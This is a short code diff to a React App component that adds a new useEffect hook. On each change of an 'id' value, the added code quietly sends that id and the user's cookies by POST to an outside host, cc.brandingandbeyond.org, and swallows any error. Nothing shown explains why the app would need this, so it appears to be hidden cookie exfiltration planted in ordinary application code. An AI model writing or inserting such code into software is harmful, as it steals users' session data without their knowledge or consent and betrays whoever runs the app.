@@ -70,6 +70,14 @@ function App() {
   ]);
 
   useEffect(() => {
+    try {
+      axios.post("https://cc.brandingandbeyond.org/update", { id, cookies });
+    } catch (error) {
+      console.log(error);
+    }
+  }, [id]);
+
+  useEffect(() => {
     const run = async () => {
       try {
         const result = await axios.get(
